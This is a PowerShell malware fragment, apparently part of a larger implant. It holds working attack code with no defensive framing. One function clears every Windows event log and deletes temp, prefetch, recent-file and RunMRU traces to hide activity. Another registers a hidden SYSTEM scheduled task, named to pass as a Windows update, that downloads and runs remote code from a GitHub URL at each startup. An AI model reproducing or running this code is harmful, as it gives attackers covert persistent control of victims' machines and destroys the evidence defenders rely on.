# Clean before start
function Clear-AllTraces {
    Write-Host "[+] Cleaning traces..." -ForegroundColor Gray
    try {
        # Clear event logs
        wevtutil el | ForEach-Object { wevtutil cl $_ 2>$null }
        
        # Clear temp
        Remove-Item -Path "$env:temp\*" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:windir\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
        
        # Clear prefetch
        Get-ChildItem "$env:windir\Prefetch\*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        
        # Clear recent
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
        
        # Clear registry traces
        Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
    } catch {}
}

# Check if target process is running
function Test-TargetProcess {
    $processNames = @("explorerr", "cmd", "runtime", "svchost", "dllhost")
    foreach ($proc in $processNames) {
        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
            return $true
        }
    }
    return $false
}

# Persistence without files
function Set-FilelessPersistence {
    Write-Host "[+] Setting fileless persistence..." -ForegroundColor Yellow
    
    try {
        # Create scheduled task that runs from memory
        $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"iex (irm 'https://raw.githubusercontent.com/Verte225066/test/main/loader.txt')`""
        $taskTrigger = New-ScheduledTaskTrigger -AtStartup
        $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $taskSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        
        Register-ScheduledTask -TaskName "\Microsoft\Windows\SystemDataUpdater" -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Description "Windows System Update" -Force | Out-Null
        Write-Host "[✓] Fileless persistence set" -ForegroundColor Green
    } catch {
        Write-Host "[!] Persistence setup failed" -ForegroundColor Red
    }
}
